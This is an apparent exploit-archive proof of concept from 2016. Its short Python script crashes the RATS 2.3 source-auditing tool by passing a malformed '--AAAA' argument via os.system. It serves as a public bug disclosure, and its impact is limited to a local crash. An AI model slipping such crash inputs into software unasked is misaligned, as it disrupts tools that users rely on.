# Exploit Title: RATS 2.3 Crash POC
# Date: 25th April 2016
# Exploit Author: David Silveiro
# Author Contact: twitter.com/david_silveiro
# Website: Xino.co.uk
# Software Link: https://code.google.com/archive/p/rough-auditing-tool-for-security/downloads
# Version: RATS 2.3
# Tested on: Ubuntu 14.04 LTS
# CVE : 0 day

from shlex import split
from os import system


def crash():

    try:
        com = ('rats --AAAA')
        return system(com)
    
    except:
        print("Is RATS installed?")


def main():

    print("Author:   David Silveiro        ")
    print("Website:  Xino.co.uk            ")
    print("Title:    POC RATS v2.3 Crash \n")

    crash()


if __name__ == "__main__":
    main()
    